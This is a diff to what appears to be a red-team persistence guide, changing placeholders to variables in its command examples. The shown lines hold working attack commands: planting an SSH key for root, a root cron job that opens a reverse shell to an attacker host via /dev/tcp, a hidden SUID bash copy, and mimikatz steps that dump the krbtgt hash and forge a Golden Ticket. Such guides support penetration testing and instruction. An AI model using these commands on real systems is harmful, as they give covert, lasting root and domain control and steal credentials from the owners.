@@ -28,7 +28,7 @@ Prefer techniques that blend with normal system activity:
 echo '<your-public-key>' >> /root/.ssh/authorized_keys
 
 # Cron job (execute every minute as root)
-echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' >> /etc/crontab
+echo '* * * * * root bash -i >& /dev/tcp/$LHOST/<port> 0>&1' >> /etc/crontab
 
 # SUID shell (instant root on return)
 cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
@@ -64,7 +64,7 @@ Domain-level persistence survives local remediation, the account or ticket remai
 ```powershell
 # Golden Ticket - valid for 10 years by default
 mimikatz # lsadump::lsa /patch         # dump krbtgt hash
-mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<sid> /krbtgt:<hash> /ptt
+mimikatz # kerberos::golden /user:Administrator /domain:$DOMAIN /sid:<sid> /krbtgt:<hash> /ptt
 ```
 
 See [Active Directory Persistence](../privilege-escalation/active-directory/persistence.md) for Golden Ticket and Shadow Copy techniques.
